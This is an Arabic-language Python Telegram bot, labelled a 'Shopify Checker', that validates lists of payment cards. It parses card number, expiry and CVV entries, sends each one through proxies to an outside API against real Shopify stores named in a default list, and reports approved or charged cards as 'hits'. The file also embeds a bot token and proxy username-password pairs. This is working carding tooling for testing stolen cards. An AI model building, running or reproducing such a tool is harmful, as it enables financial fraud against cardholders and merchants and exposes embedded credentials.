import telebot
from telebot import types
import requests
import re
import threading
import random
import time
import json
import os
from datetime import datetime

# ==================== التوكن والمتغيرات ====================
TOKEN = '8558756991:AAGlA5RUqv3QE75HKHXHNWcYTI0hcYyAy1M'
bot = telebot.TeleBot(TOKEN)
bot.remove_webhook()

OWNER_ID = 1013384909  # ضع معرفك هنا

# ==================== ملفات التخزين ====================
SITES_FILE = "sites.json"
PROXIES_FILE = "proxies.json"
STATS_FILE = "stats.json"

# تحميل البيانات
def load_sites():
    if os.path.exists(SITES_FILE):
        with open(SITES_FILE, 'r') as f:
            return json.load(f)
    return []

def save_sites(sites):
    with open(SITES_FILE, 'w') as f:
        json.dump(sites, f, indent=4)

def load_proxies():
    if os.path.exists(PROXIES_FILE):
        with open(PROXIES_FILE, 'r') as f:
            return json.load(f)
    return []

def save_proxies(proxies):
    with open(PROXIES_FILE, 'w') as f:
        json.dump(proxies, f, indent=4)

def load_stats():
    if os.path.exists(STATS_FILE):
        with open(STATS_FILE, 'r') as f:
            return json.load(f)
    return {"total_checked": 0, "total_hits": 0, "total_dead": 0}

def save_stats(stats):
    with open(STATS_FILE, 'w') as f:
        json.dump(stats, f, indent=4)

# البيانات الافتراضية
SITES_LIST = load_sites()
PROXIES_LIST = load_proxies()

# إذا كانت القوائم فارغة، أضف البيانات الافتراضية
if not SITES_LIST:
    SITES_LIST = [
        "https://makeship.com", "https://dutchwaregear.com", "https://sockbox.com",
        "https://www.nativecos.com", "https://www.tula.com", "https://drmtlgy.myshopify.com"
    ]
    save_sites(SITES_LIST)

if not PROXIES_LIST:
    PROXIES_LIST = [
        "http://iEN2jEvl:5TqD95Nm664K@proxy.taquito.pp.ua:8080",
        "socks5h://iEN2jEvl:5TqD95Nm664K@proxy.taquito.pp.ua:10080"
    ]
    save_proxies(PROXIES_LIST)

# ==================== متغيرات الفحص ====================
checking_active = False
checking_thread = None
current_stats = {"live": 0, "dead": 0, "total": 0, "current": 0, "last_card": "", "last_response": "", "errors": []}
site_errors = {}
proxy_errors = {}

# ==================== لوحة التحكم الرئيسية ====================
def main_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.row(
        types.InlineKeyboardButton("🚀 بدء الفحص", callback_data="start_check"),
        types.InlineKeyboardButton("⏹ إيقاف الفحص", callback_data="stop_check")
    )
    markup.row(
        types.InlineKeyboardButton("📊 الإحصائيات", callback_data="stats"),
        types.InlineKeyboardButton("🌐 المواقع", callback_data="manage_sites")
    )
    markup.row(
        types.InlineKeyboardButton("🔌 البروكسيات", callback_data="manage_proxies"),
        types.InlineKeyboardButton("📁 ملفاتي", callback_data="my_files")
    )
    markup.row(
        types.InlineKeyboardButton("⚠️ الأخطاء", callback_data="view_errors"),
        types.InlineKeyboardButton("🔄 تحديث", callback_data="refresh")
    )
    return markup

# ==================== قائمة إدارة المواقع ====================
def sites_menu():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("➕ إضافة موقع", callback_data="add_site"))
    markup.add(types.InlineKeyboardButton("📋 قائمة المواقع", callback_data="list_sites"))
    markup.add(types.InlineKeyboardButton("🗑 حذف موقع", callback_data="delete_site"))
    markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
    return markup

# ==================== قائمة إدارة البروكسيات ====================
def proxies_menu():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("➕ إضافة بروكسي", callback_data="add_proxy"))
    markup.add(types.InlineKeyboardButton("📋 قائمة البروكسيات", callback_data="list_proxies"))
    markup.add(types.InlineKeyboardButton("🗑 حذف بروكسي", callback_data="delete_proxy"))
    markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
    return markup

# ==================== شاشة الفحص ====================
def checking_screen():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.row(
        types.InlineKeyboardButton("⏹ إيقاف", callback_data="stop_check"),
        types.InlineKeyboardButton("🔄 تحديث", callback_data="refresh_check")
    )
    return markup

# ==================== الأوامر ====================
@bot.message_handler(commands=['start'])
def start_cmd(m):
    if m.from_user.id != OWNER_ID:
        bot.reply_to(m, "⛔ هذا البوت خاص بصاحبه فقط")
        return
    
    welcome_text = f"""
🤖 **بوت فحص Shopify - مصطفى النجم**

━━━━━━━━━━━━━━━━━━━
📊 **الإحصائيات الحالية:**
• 🌐 مواقع نشطة: `{len(SITES_LIST)}`
• 🔌 بروكسيات نشطة: `{len(PROXIES_LIST)}`
• ✅ إجمالي الهيتات: `{current_stats['live']}`
• ❌ إجمالي الديد: `{current_stats['dead']}`

━━━━━━━━━━━━━━━━━━━
💬 أرسل كومبو أو ملف .txt لبدء الفحص
━━━━━━━━━━━━━━━━━━━
👨‍💻 @o8380
"""
    bot.send_message(m.chat.id, welcome_text, parse_mode="Markdown", reply_markup=main_menu())

@bot.message_handler(commands=['addsite'])
def add_site_cmd(m):
    if m.from_user.id != OWNER_ID:
        return
    msg = bot.reply_to(m, "🌐 أرسل رابط الموقع:\nمثال: https://example.com")
    bot.register_next_step_handler(msg, save_new_site)

def save_new_site(m):
    site = m.text.strip()
    if not site.startswith("https://") and not site.startswith("http://"):
        site = "https://" + site
    if site not in SITES_LIST:
        SITES_LIST.append(site)
        save_sites(SITES_LIST)
        bot.reply_to(m, f"✅ تم إضافة الموقع:\n{site}")
    else:
        bot.reply_to(m, "❌ الموقع موجود بالفعل")

@bot.message_handler(commands=['addproxy'])
def add_proxy_cmd(m):
    if m.from_user.id != OWNER_ID:
        return
    msg = bot.reply_to(m, "🔌 أرسل البروكسي:\nمثال: http://user:pass@host:port")
    bot.register_next_step_handler(msg, save_new_proxy)

def save_new_proxy(m):
    proxy = m.text.strip()
    if proxy not in PROXIES_LIST:
        PROXIES_LIST.append(proxy)
        save_proxies(PROXES_LIST)
        bot.reply_to(m, f"✅ تم إضافة البروكسي:\n{proxy}")
    else:
        bot.reply_to(m, "❌ البروكسي موجود بالفعل")

@bot.message_handler(content_types=['document', 'text'])
def handle_input(m):
    if m.from_user.id != OWNER_ID:
        return
    
    global checking_active, checking_thread
    
    if checking_active:
        bot.reply_to(m, "⚠️ يوجد فحص نشط حالياً! أرسل الكومبو بعد الانتهاء أو أوقف الفحص أولاً.")
        return
    
    cards = []
    if m.content_type == 'text':
        if m.text.startswith('/'):
            return
        cards = re.findall(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', m.text)
    else:
        try:
            file_info = bot.get_file(m.document.file_id)
            content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
            cards = re.findall(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', content)
        except Exception as e:
            bot.reply_to(m, f"❌ خطأ في قراءة الملف: {str(e)}")
            return
    
    if not cards:
        bot.reply_to(m, "❌ لم يتم العثور على بطاقات صالحة!\nالصيغة المطلوبة: xxxxxxxxxxxxxxxx|MM|YY|CVV")
        return
    
    total_cards = len(cards)
    global current_stats
    current_stats = {
        "live": 0, "dead": 0, "total": total_cards, "current": 0,
        "last_card": "", "last_response": "", "errors": []
    }
    site_errors.clear()
    proxy_errors.clear()
    
    # إرسال شاشة بدء الفحص
    msg = bot.send_message(m.chat.id, f"""
🚀 **بدء الفحص الشامل**
━━━━━━━━━━━━━━━━━━━
💳 عدد البطاقات: `{total_cards}`
🌐 مواقع متاحة: `{len(SITES_LIST)}`
🔌 بروكسيات متاحة: `{len(PROXIES_LIST)}`
━━━━━━━━━━━━━━━━━━━
⏳ جاري الفحص...
""", parse_mode="Markdown", reply_markup=checking_screen())
    
    checking_active = True
    checking_thread = threading.Thread(target=run_checking, args=(m.chat.id, msg.message_id, cards))
    checking_thread.start()

# ==================== وظيفة الفحص الرئيسية ====================
def run_checking(chat_id, msg_id, cards):
    global checking_active, current_stats
    
    for idx, card in enumerate(cards):
        if not checking_active:
            bot.send_message(chat_id, "⏹ تم إيقاف الفحص يدوياً")
            break
        
        if not SITES_LIST:
            bot.send_message(chat_id, "❌ لا توجد مواقع متاحة! أضف مواقع أولاً باستخدام /addsite")
            break
        
        if not PROXIES_LIST:
            bot.send_message(chat_id, "❌ لا توجد بروكسيات متاحة! أضف بروكسيات أولاً باستخدام /addproxy")
            break
        
        site = random.choice(SITES_LIST)
        proxy = random.choice(PROXIES_LIST)
        current_stats["current"] = idx + 1
        current_stats["last_card"] = card
        
        try:
            api_url = f"https://web-production-a8008.up.railway.app/shopify?site={site}&cc={card}&proxy={proxy}"
            start_time = time.time()
            res = requests.get(api_url, timeout=25)
            elapsed = round(time.time() - start_time, 2)
            
            if res.status_code != 200:
                raise Exception(f"HTTP {res.status_code}")
            
            data = res.json()
            response_msg = str(data.get("Response", "N/A")).upper()
            status = data.get("Status", False)
            
            current_stats["last_response"] = response_msg
            
            success_keys = ["APPROVED", "SUCCESS", "FUNDS", "CHARGED", "DS_REQUIRED", "AUTHENTICATE", "AUTHORIZED"]
            is_live = status == True or any(k in response_msg for k in success_keys)
            
            if is_live:
                current_stats["live"] += 1
                bot.send_message(chat_id, f"""
🎯 **HIT / APPROVED**
━━━━━━━━━━━━━━━━━━━
💳 **CC:** `{card}`
📝 **Response:** `{response_msg}`
🌐 **Site:** `{site}`
⏱ **Time:** `{elapsed}s`
━━━━━━━━━━━━━━━━━━━
✅ مصطفى النجم 🇮🇶
""", parse_mode="Markdown")
            else:
                current_stats["dead"] += 1
                if "TIMEOUT" in response_msg or "CONNECTION" in response_msg or "500" in response_msg:
                    if site not in site_errors:
                        site_errors[site] = 0
                    site_errors[site] += 1
                    if site_errors[site] >= 3:
                        SITES_LIST.remove(site)
                        save_sites(SITES_LIST)
                        bot.send_message(chat_id, f"⚠️ تم حذف الموقع `{site}` بسبب أخطاء متكررة", parse_mode="Markdown")
                
                if "CONNECTION" in response_msg or "TIMEOUT" in response_msg:
                    if proxy not in proxy_errors:
                        proxy_errors[proxy] = 0
                    proxy_errors[proxy] += 1
                    if proxy_errors[proxy] >= 3:
                        PROXIES_LIST.remove(proxy)
                        save_proxies(PROXIES_LIST)
                        bot.send_message(chat_id, f"⚠️ تم حذف البروكسي `{proxy[:50]}...` بسبب أخطاء متكررة", parse_mode="Markdown")
            
        except requests.exceptions.Timeout:
            current_stats["dead"] += 1
            error_msg = "TIMEOUT - تأخر الاستجابة"
            current_stats["errors"].append(f"{card}: {error_msg}")
            
            if site not in site_errors:
                site_errors[site] = 0
            site_errors[site] += 1
            if site_errors[site] >= 2:
                if site in SITES_LIST:
                    SITES_LIST.remove(site)
                    save_sites(SITES_LIST)
                    bot.send_message(chat_id, f"⚠️ تم حذف الموقع `{site}` (تايم أوت متكرر)", parse_mode="Markdown")
            
            bot.send_message(chat_id, f"⚠️ **خطأ:** `{card}` → {error_msg}\n🌐 {site}", parse_mode="Markdown")
            
        except requests.exceptions.ConnectionError:
            current_stats["dead"] += 1
            error_msg = "CONNECTION ERROR - مشكلة في الاتصال"
            current_stats["errors"].append(f"{card}: {error_msg}")
            
            if proxy in PROXIES_LIST:
                PROXIES_LIST.remove(proxy)
                save_proxies(PROXIES_LIST)
                bot.send_message(chat_id, f"⚠️ تم حذف بروكسي معطل: `{proxy[:50]}...`", parse_mode="Markdown")
            
        except Exception as e:
            current_stats["dead"] += 1
            error_msg = f"ERROR: {str(e)[:50]}"
            current_stats["errors"].append(f"{card}: {error_msg}")
            bot.send_message(chat_id, f"⚠️ **خطأ:** `{card}` → {error_msg}", parse_mode="Markdown")
        
        # تحديث شاشة التقدم
        try:
            progress = int((idx + 1) / len(cards) * 100)
            bot.edit_message_text(f"""
🚀 **فحص Shopify - مصطفى النجم**
━━━━━━━━━━━━━━━━━━━
📊 **التقدم:** [{idx+1}/{len(cards)}] ({progress}%)
✅ **Approved:** `{current_stats['live']}`
❌ **Declined:** `{current_stats['dead']}`
━━━━━━━━━━━━━━━━━━━
💳 **آخر بطاقة:** `{card[:16]}...`
📝 **الرد:** `{current_stats['last_response'][:30]}`
━━━━━━━━━━━━━━━━━━━
🌐 **مواقع نشطة:** `{len(SITES_LIST)}`
🔌 **بروكسيات نشطة:** `{len(PROXIES_LIST)}`
━━━━━━━━━━━━━━━━━━━
⚡ @o8380
""", chat_id, msg_id, parse_mode="Markdown", reply_markup=checking_screen())
        except:
            pass
        
        time.sleep(1)  # تأخير بين كل فحص
    
    checking_active = False
    
    # إرسال التقرير النهائي
    final_report = f"""
🏁 **تقرير الفحص النهائي**
━━━━━━━━━━━━━━━━━━━
📊 **إجمالي البطاقات:** `{len(cards)}`
✅ **Hits:** `{current_stats['live']}`
❌ **Dead:** `{current_stats['dead']}`
📈 **نسبة النجاح:** `{round(current_stats['live']/len(cards)*100, 1)}%`
━━━━━━━━━━━━━━━━━━━
🌐 **المواقع المتبقية:** `{len(SITES_LIST)}`
🔌 **البروكسيات المتبقية:** `{len(PROXIES_LIST)}`
━━━━━━━━━━━━━━━━━━━
⚡ @o8380
"""
    bot.send_message(chat_id, final_report, parse_mode="Markdown", reply_markup=main_menu())

# ==================== معالجة الأزرار ====================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    global checking_active
    
    if call.data == "start_check":
        bot.answer_callback_query(call.id, "📁 أرسل الكومبو أو ملف .txt لبدء الفحص")
        bot.send_message(call.message.chat.id, "📁 أرسل الكومبو أو ملف .txt لبدء الفحص")
    
    elif call.data == "stop_check":
        checking_active = False
        bot.answer_callback_query(call.id, "⏹ تم إيقاف الفحص")
        bot.edit_message_text("⏹ تم إيقاف الفحص", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
    
    elif call.data == "stats":
        stats = load_stats()
        text = f"""
📊 **الإحصائيات العامة**
━━━━━━━━━━━━━━━━━━━
🔢 إجمالي الفحوصات: `{stats['total_checked']}`
🎯 إجمالي الهيتات: `{stats['total_hits']}`
❌ إجمالي الديد: `{stats['total_dead']}`
━━━━━━━━━━━━━━━━━━━
🌐 المواقع النشطة: `{len(SITES_LIST)}`
🔌 البروكسيات النشطة: `{len(PROXIES_LIST)}`
━━━━━━━━━━━━━━━━━━━
📊 **آخر فحص:**
✅ Hits: `{current_stats['live']}`
❌ Dead: `{current_stats['dead']}`
"""
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=main_menu())
    
    elif call.data == "manage_sites":
        bot.edit_message_text("🌐 **إدارة المواقع**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=sites_menu())
    
    elif call.data == "manage_proxies":
        bot.edit_message_text("🔌 **إدارة البروكسيات**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=proxies_menu())
    
    elif call.data == "list_sites":
        if SITES_LIST:
            sites_text = "\n".join([f"• {s}" for s in SITES_LIST[:20]])
            if len(SITES_LIST) > 20:
                sites_text += f"\n...و{len(SITES_LIST)-20} موقع آخر"
            bot.edit_message_text(f"📋 **قائمة المواقع ({len(SITES_LIST)}):**\n━━━━━━━━━━━━━━━━━━━\n{sites_text}", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=sites_menu())
        else:
            bot.edit_message_text("❌ لا توجد مواقع حالياً", call.message.chat.id, call.message.message_id, reply_markup=sites_menu())
    
    elif call.data == "list_proxies":
        if PROXIES_LIST:
            proxies_text = "\n".join([f"• {p[:60]}..." for p in PROXIES_LIST[:10]])
            bot.edit_message_text(f"📋 **قائمة البروكسيات ({len(PROXIES_LIST)}):**\n━━━━━━━━━━━━━━━━━━━\n{proxies_text}", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=proxies_menu())
        else:
            bot.edit_message_text("❌ لا توجد بروكسيات حالياً", call.message.chat.id, call.message.message_id, reply_markup=proxies_menu())
    
    elif call.data == "add_site":
        msg = bot.send_message(call.message.chat.id, "🌐 أرسل رابط الموقع:\nمثال: https://example.com")
        bot.register_next_step_handler(msg, save_new_site)
        bot.delete_message(call.message.chat.id, call.message.message_id)
    
    elif call.data == "add_proxy":
        msg = bot.send_message(call.message.chat.id, "🔌 أرسل البروكسي:\nمثال: http://user:pass@host:port")
        bot.register_next_step_handler(msg, save_new_proxy)
        bot.delete_message(call.message.chat.id, call.message.message_id)
    
    elif call.data == "delete_site":
        if SITES_LIST:
            markup = types.InlineKeyboardMarkup(row_width=1)
            for site in SITES_LIST[:10]:
                markup.add(types.InlineKeyboardButton(f"🗑 {site[:40]}", callback_data=f"del_site_{site}"))
            markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="manage_sites"))
            bot.edit_message_text("🗑 **اختر موقعاً للحذف:**", call.message.chat.id, call.message.message_id, reply_markup=markup)
        else:
            bot.answer_callback_query(call.id, "❌ لا توجد مواقع للحذف")
    
    elif call.data == "delete_proxy":
        if PROXIES_LIST:
            markup = types.InlineKeyboardMarkup(row_width=1)
            for i, proxy in enumerate(PROXIES_LIST[:10]):
                markup.add(types.InlineKeyboardButton(f"🗑 Proxy #{i+1}", callback_data=f"del_proxy_{i}"))
            markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="manage_proxies"))
            bot.edit_message_text("🗑 **اختر بروكسياً للحذف:**", call.message.chat.id, call.message.message_id, reply_markup=markup)
        else:
            bot.answer_callback_query(call.id, "❌ لا توجد بروكسيات للحذف")
    
    elif call.data.startswith("del_site_"):
        site = call.data[9:]
        if site in SITES_LIST:
            SITES_LIST.remove(site)
            save_sites(SITES_LIST)
            bot.answer_callback_query(call.id, f"✅ تم حذف: {site[:40]}")
            bot.edit_message_text("🌐 **إدارة المواقع**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=sites_menu())
    
    elif call.data.startswith("del_proxy_"):
        idx = int(call.data[10:])
        if idx < len(PROXIES_LIST):
            removed = PROXIES_LIST.pop(idx)
            save_proxies(PROXIES_LIST)
            bot.answer_callback_query(call.id, f"✅ تم حذف البروكسي")
        bot.edit_message_text("🔌 **إدارة البروكسيات**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=proxies_menu())
    
    elif call.data == "view_errors":
        if current_stats["errors"]:
            errors_text = "\n".join(current_stats["errors"][-10:])
            bot.edit_message_text(f"⚠️ **أخر 10 أخطاء:**\n━━━━━━━━━━━━━━━━━━━\n{errors_text}", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=main_menu())
        else:
            bot.edit_message_text("✅ لا توجد أخطاء", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
    
    elif call.data == "refresh_check":
        bot.answer_callback_query(call.id, "🔄 تم التحديث")
    
    elif call.data == "back":
        bot.edit_message_text("✅ الرئيسية", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
    
    elif call.data == "refresh":
        bot.edit_message_text("✅ تم التحديث", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
    
    elif call.data == "my_files":
        bot.answer_callback_query(call.id, "📁 أرسل ملف .txt لفحصه")

# ==================== تشغيل البوت ====================
print("""
╔══════════════════════════════════════╗
║         🤖 بوت مصطفى النجم 🤖         ║
║     Developer: @o8380                ║
║     Version: 7.0 - Shopify Checker   ║
╚══════════════════════════════════════╝
""")
print(f"✅ المواقع المحملة: {len(SITES_LIST)}")
print(f"✅ البروكسيات المحملة: {len(PROXIES_LIST)}")
print("🚀 البوت يعمل الآن...")

bot.infinity_polling(timeout=30)
